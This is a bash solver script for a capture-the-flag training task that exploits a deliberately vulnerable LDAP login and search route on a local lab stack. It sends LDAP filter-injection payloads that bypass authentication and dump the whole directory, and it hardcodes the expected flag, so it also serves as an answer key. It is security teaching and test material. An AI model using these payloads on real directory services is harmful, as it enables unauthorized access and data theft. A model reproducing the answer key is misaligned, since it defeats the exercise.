#!/usr/bin/env bash
# solvers/p4_3.sh — Task 4.3 "Zodiac Twelve Directory Breach" canonical exploit.
#
# challenges/phase4.py's p4_3 block builds two real LDAP filters directly
# out of raw request input, string-concatenated with zero escaping of RFC
# 4515 filter metacharacters (`* ( ) \` and NUL):
#
#   login:  (&(uid={username})(userPassword={password}))
#   search: (&(uid={uid})(objectClass=inetOrgPerson))
#
# and hands each straight to a real python-ldap search_s() against the
# real seeded OpenLDAP directory (ou=zodiac,dc=hunterassoc,dc=org). An
# ordinary caller supplies plain text with none of those characters and
# gets an ordinary equality filter; a caller who includes `(`/`)` to add
# or close filter clauses, or a bare `*` to turn an equality assertion
# into a presence/wildcard assertion, gets to rewrite the filter's logic.
#
# This script proves four things against the live stack, in order:
#
#   1. A normal wrong-password login (two plain strings) genuinely FAILS.
#   2. A normal, well-formed single-uid directory search (uid=chairman,
#      not an injection — a real caller could legitimately ask for this
#      exact person) never reveals the chairman's `description` — proving
#      the flag is NOT reachable through any non-injection code path.
#   3. The auth-bypass payload (username=*)(uid=* , password=*) logs the
#      caller in as *some* real directory member with no valid credential
#      at all.
#   4. The enumeration payload (uid=*)(objectClass=* ) widens the search
#      filter to dump the entire ou=zodiac roster — including uid=chairman
#      and its `description`, which is where the flag lives.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{star_closes_the_filter}"
ROUTE="${BASE}/p4/zodiac"

fail=0

echo "[p4_3] target: ${ROUTE}"

# --- Step 1 — a genuine wrong-password login must FAIL --------------------
echo "[p4_3] step 1 — legitimate login with a wrong/guessed plain-string password"
echo "  POST username=chairman&password=totally-wrong-guess"

legit_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "username=chairman" \
    --data-urlencode "password=totally-wrong-guess")
echo "  response: ${legit_resp}"

if echo "$legit_resp" | grep -qF "$FLAG"; then
    echo "[p4_3] FAIL: a wrong plain-string password logged in successfully — the"
    echo "  route is accepting any credential, not specifically the filter"
    echo "  injection this lesson is about."
    fail=1
fi
if echo "$legit_resp" | grep -q '"success":true'; then
    echo "[p4_3] FAIL: wrong plain-string password reported success:true"
    fail=1
else
    echo "  ok: wrong plain-string password was correctly rejected"
fi

# --- Step 2 — a normal, well-formed uid=chairman search must NOT leak -----
echo "[p4_3] step 2 — normal, non-injected directory search for uid=chairman"
echo "  GET /p4/zodiac?uid=chairman"

normal_resp=$(curl -s -G "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "uid=chairman")
echo "  response: ${normal_resp}"

if echo "$normal_resp" | grep -qF "$FLAG"; then
    echo "[p4_3] FAIL: an ordinary, well-formed lookup of uid=chairman leaked the"
    echo "  flag with no injection at all — the flag must only be reachable"
    echo "  via the broken filter, not via legitimate use of the search."
    fail=1
else
    echo "  ok: a direct, well-formed uid=chairman lookup does not leak description"
fi

# --- Step 3 — auth-bypass payload ------------------------------------------
echo '[p4_3] step 3 — auth bypass: username=*)(uid=* & password=*'

bypass_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode 'username=*)(uid=*' \
    --data-urlencode 'password=*')
echo "  response: ${bypass_resp}"

if echo "$bypass_resp" | grep -q '"success":true'; then
    echo "  ok: filter-injection auth bypass logged in with no valid credential"
else
    echo "[p4_3] FAIL: auth-bypass payload did not log in (no success:true)"
    fail=1
fi

# --- Step 4 — enumeration payload -------------------------------------------
echo '[p4_3] step 4 — directory enumeration: uid=*)(objectClass=*'

dump_resp=$(curl -s -G "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode 'uid=*)(objectClass=*')
echo "  response: ${dump_resp}"

if echo "$dump_resp" | grep -q '"dump_mode":true' && echo "$dump_resp" | grep -qF "$FLAG"; then
    echo "  ok: enumeration payload dumped the full roster — flag recovered: ${FLAG}"
else
    echo "[p4_3] FAIL: enumeration payload did not dump the roster / flag missing"
    fail=1
fi

if [ "$fail" -ne 0 ]; then
    echo "[p4_3] FAIL"
    exit 1
fi

echo "[p4_3] ok: wrong password rejected, direct chairman lookup safe, bypass +"
echo "[p4_3]     enumeration both worked against the real seeded OpenLDAP directory"
echo "[p4_3] PASS"
exit 0
